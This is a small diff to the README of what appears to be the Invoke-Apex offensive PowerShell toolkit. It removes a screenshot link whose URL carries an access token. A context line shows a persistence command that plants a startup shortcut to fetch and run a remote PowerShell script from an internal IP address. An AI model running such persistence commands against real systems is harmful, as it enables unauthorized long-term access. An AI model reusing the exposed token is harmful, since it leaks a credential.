@@ -269,8 +269,6 @@ PS> Invoke-Persistence -StartupLnk -PsFileUrl http://192.168.42.89/script.ps1
 
 ### Invoke-Persistence(StartupLnk) ###
 ```
-![ScreenShot](https://raw.githubusercontent.com/securemode/Invoke-Apex/master/Persistence-StartupLnk.png?token=ApTHqSqJjBRvPPdJSSdoJxQ0cxrkPEGbks5cN41ZwA%3D%3D)
-
 
 # Available Functions / Commands
 ## Invoke-Apex
